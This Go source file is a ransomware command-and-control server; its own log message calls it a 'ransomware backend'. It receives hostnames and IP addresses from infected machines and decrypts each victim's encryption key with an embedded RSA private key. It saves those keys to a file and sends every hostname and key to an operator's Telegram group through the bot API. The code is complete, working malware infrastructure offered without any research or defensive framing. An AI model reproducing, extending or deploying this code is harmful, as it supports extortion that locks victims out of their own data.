package main

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	b64 "encoding/base64"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"

	"SafeCrypt/assets/secret"

	"github.com/gorilla/mux"
	"github.com/joho/godotenv"
)

type Host struct {
	Hostname string   `json:"hostname"`
	IP       []string `json:"ip"`
}

type Key struct {
	EncryptedKey string `json:"EncryptedKey"`
	Hostname     string `json:"Hostname"`
}

func main() {

	router := mux.NewRouter()

	router.HandleFunc("/info/", getRoot).Methods("GET")
	router.HandleFunc("/info/getInfo", GetInfo).Methods("POST")
	router.HandleFunc("/info/getKey", GetKey).Methods("POST")
	router.NotFoundHandler = http.HandlerFunc(NotFoundHandler)

	log.Println("Started Serving ransomware backend at http://127.0.0.1:4455")
	err := http.ListenAndServe(":4455", router)

	if errors.Is(err, http.ErrServerClosed) {
		log.Println("server closed")

	} else if err != nil {
		log.Printf("error starting server: %v\n", err)
		os.Exit(1)
	}
}

func GetKey(w http.ResponseWriter, r *http.Request) {

	privateKeyAsset, _ := secret.Asset("assets/private_key.pem")

	block, _ := pem.Decode(privateKeyAsset)
	if block == nil {
		log.Println("Error getting the private_key!!")
		return

	}

	privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		log.Println("Error parsing the private key!", err)
		return

	}

	var encryptedKey Key

	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return

	}

	err = json.NewDecoder(r.Body).Decode(&encryptedKey)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return

	}

	decodedKey, _ := b64.StdEncoding.DecodeString(encryptedKey.EncryptedKey)

	plaintext, err := decryptKey(decodedKey, privateKey)
	if err != nil {
		log.Println("Error with decoding encrypted key")
		http.Error(w, "Error with EncryptedKey", http.StatusBadRequest)
		return
	}

	json_response, _ := json.Marshal(map[string]string{
		"Status": "OK",
		// "PlainText": string(plaintext),
	})

	log.Println("Enter this plaintexkey to the decrypter!", string(plaintext))
	err = SaveKeyFile(encryptedKey.Hostname, string(plaintext))
	if err != nil {
		log.Println(err)
		return
	}

	telegramAPI, err := getEnvVariable("TELEGRAM_API")
	if err == nil {
		groupID, err2 := getEnvVariable("TELEGRAM_GROUP")
		if err2 == nil {
			go sendTelegramMessage(telegramAPI, groupID, fmt.Sprintf("Got a new connection from %s and the key is %s", encryptedKey.Hostname, string(plaintext)))
		} else {
			fmt.Println(err2)
		}
	} else {
		fmt.Println(err)
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write(json_response)

}

func getRoot(w http.ResponseWriter, r *http.Request) {
	log.Println("got / request")
	json_response, _ := json.Marshal(map[string]string{
		"Status": "OK",
		"Answer": "This is my website!",
	})

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write(json_response)
}

func GetInfo(w http.ResponseWriter, r *http.Request) {

	var h Host

	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return

	}

	err := json.NewDecoder(r.Body).Decode(&h)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return

	}

	log.Printf("Recevied host: %s Recevied IPs %s", h.Hostname, strings.Join(h.IP, ", "))

	err = SaveFile(&h)
	if err != nil {
		log.Println("Fucked up!")

	}

	json_response, _ := json.Marshal(map[string]string{
		"Status": "OK",
		"Answer": "Hello Request!",
	})

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write(json_response)

}

func SaveFile(data *Host) error {

	filename := data.Hostname + ".txt"
	file, errFile := os.OpenFile(
		filename,
		os.O_APPEND|os.O_CREATE|os.O_WRONLY,
		0644,
	)
	if errFile != nil {
		log.Println("Error creating file!")
		return errFile

	}
	defer file.Close()

	listOfIPs := strings.Join(data.IP, "\n")
	listOfIPs = strings.TrimLeft(listOfIPs, "\n") + "\n"

	_, errFile = file.WriteString(listOfIPs)
	if errFile != nil {
		log.Println("Failed to append to the file!")
		return errFile

	}
	return nil
}

func SaveKeyFile(hostname string, key string) error {

	filename := "./keys.txt"
	file, errFile := os.OpenFile(
		filename,
		os.O_APPEND|os.O_CREATE|os.O_WRONLY,
		0644,
	)
	if errFile != nil {
		log.Println("Error creating file!")
		return errFile

	}
	defer file.Close()

	file_contant := fmt.Sprintf("%s: %s\n", hostname, key)
	_, errFile = file.WriteString(file_contant)
	if errFile != nil {
		log.Println("Failed to append to the file!")
		return errFile

	}
	return nil

}

func decryptKey(ciphertext []byte, privKey *rsa.PrivateKey) ([]byte, error) {

	plaintext, err := rsa.DecryptPKCS1v15(
		rand.Reader,
		privKey,
		ciphertext,
	)

	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

func sendTelegramMessage(token string, chatID string, message string) {
	// Construct the URL for the Telegram Bot API
	apiUrl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)

	requestBody := map[string]interface{}{
		"chat_id": chatID,
		"text":    message,
	}
	requestBodyBytes, err := json.Marshal(requestBody)
	if err != nil {
		fmt.Println("Got error..")
		return

	}

	response, err := http.Post(
		apiUrl,
		"application/json",
		bytes.NewBuffer(requestBodyBytes),
	)

	if err != nil {
		fmt.Println(err)
	}
	defer response.Body.Close()

	// Check the response status code
	if response.StatusCode != http.StatusOK {
		fmt.Printf("Telegram API returned status %d\n", response.StatusCode)
	}

}

func NotFoundHandler(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusNotFound)
	w.Write([]byte("404 Page Not Found"))
}

func getEnvVariable(key string) (string, error) {
	err := godotenv.Load(".env")
	if err != nil {
		return "", err

	}
	return os.Getenv(key), nil
}
